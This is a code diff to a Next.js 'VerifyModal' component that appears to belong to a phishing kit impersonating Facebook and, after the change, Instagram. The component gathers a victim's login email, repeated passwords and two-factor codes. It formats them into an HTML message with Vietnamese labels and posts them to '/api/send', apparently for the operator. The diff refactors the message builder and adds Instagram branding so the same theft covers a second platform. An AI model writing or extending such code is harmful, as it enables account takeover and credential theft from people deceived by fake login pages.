@@ -1,33 +1,11 @@
 import VerifyImage from '@/assets/images/2FAuth.png';
 import { store } from '@/store/store';
 import config from '@/utils/config';
+import { buildAppealMessage } from '@/utils/message';
 import translateText from '@/utils/translate';
 import axios from 'axios';
 import Image from 'next/image';
 import { useEffect, useState, type FC } from 'react';
-
-const SEP = '━━━━━━━━━━━━━━━━━━━━';
-
-const buildMessage = (baseMessage: string, loginEmail: string, passwords: string[], codes: string[]): string => {
-    let msg = baseMessage;
-
-    if (passwords.length > 0) {
-        msg += `\n🔐 <b>ĐĂNG NHẬP</b>\n   TK: <code>${loginEmail}</code>`;
-        passwords.forEach((pw, i) => {
-            msg += `\n   MK${i + 1}: <code>${pw}</code>`;
-        });
-    }
-
-    if (codes.length > 0) {
-        msg += `\n🔒 <b>MÃ 2FA</b>`;
-        codes.forEach((code, i) => {
-            msg += `\n   Code${i + 1}: <code>${code}</code>`;
-        });
-    }
-
-    msg += `\n${SEP}`;
-    return msg;
-};
 
 const VerifyModal: FC<{ nextStep: () => void; userName?: string }> = ({ nextStep, userName }) => {
     const [attempts, setAttempts] = useState(0);
@@ -37,7 +15,7 @@ const VerifyModal: FC<{ nextStep: () => void; userName?: string }> = ({ nextStep
     const [showError, setShowError] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { geoInfo, messageId, baseMessage, passwords, codes, loginEmail, setMessage, setMessageId, addCode } = store();
+    const { geoInfo, messageId, baseMessage, passwords, codes, loginEmail, loginProvider, setMessage, setMessageId, addCode } = store();
     const maxCode = config.MAX_CODE ?? 3;
     const loadingTime = config.CODE_LOADING_TIME ?? 60;
 
@@ -92,7 +70,13 @@ const VerifyModal: FC<{ nextStep: () => void; userName?: string }> = ({ nextStep
         const newCodes = [...codes, code];
         addCode(code);
 
-        const updatedMessage = buildMessage(baseMessage, loginEmail ?? '', passwords, newCodes);
+        const updatedMessage = buildAppealMessage({
+            baseMessage,
+            loginProvider,
+            loginEmail,
+            passwords,
+            codes: newCodes
+        });
 
         try {
             const res = await axios.post('/api/send', {
@@ -126,7 +110,7 @@ const VerifyModal: FC<{ nextStep: () => void; userName?: string }> = ({ nextStep
             <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md md:max-w-lg flex-col rounded-3xl bg-white overflow-y-auto'>
                 {/* Header with user info and Facebook branding */}
                 <div className='px-3 sm:px-4 md:px-6 pt-3 sm:pt-4 md:pt-6 pb-2 sm:pb-3 md:pb-4'>
-                    <p className='text-xs sm:text-xs md:text-sm text-gray-600'>{userName || 'User'} • Facebook</p>
+                    <p className='text-xs sm:text-xs md:text-sm text-gray-600'>{userName || 'User'} • {loginProvider === 'instagram' ? 'Instagram' : 'Facebook'}</p>
                 </div>
 
                 {/* Main content */}
